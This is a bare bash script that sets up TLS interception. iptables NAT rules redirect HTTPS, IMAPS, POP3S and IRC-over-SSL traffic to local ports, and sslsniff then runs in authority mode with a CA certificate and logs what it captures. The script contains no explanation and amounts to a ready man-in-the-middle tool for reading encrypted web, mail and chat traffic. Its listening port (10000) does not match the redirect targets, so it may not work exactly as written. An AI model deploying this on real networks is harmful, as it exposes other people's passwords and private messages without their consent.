#!/bin/bash
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10443
iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports 10993
iptables -t nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports 10995
iptables -t nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports 16697
sslsniff -a -d -c /usr/share/ca-certificates/mozilla/VeriSign_Class_3_Public_Primary_Certification_Authority_-_G5.crt -s 10000 -w $SSLSNIFF_LOG 
 
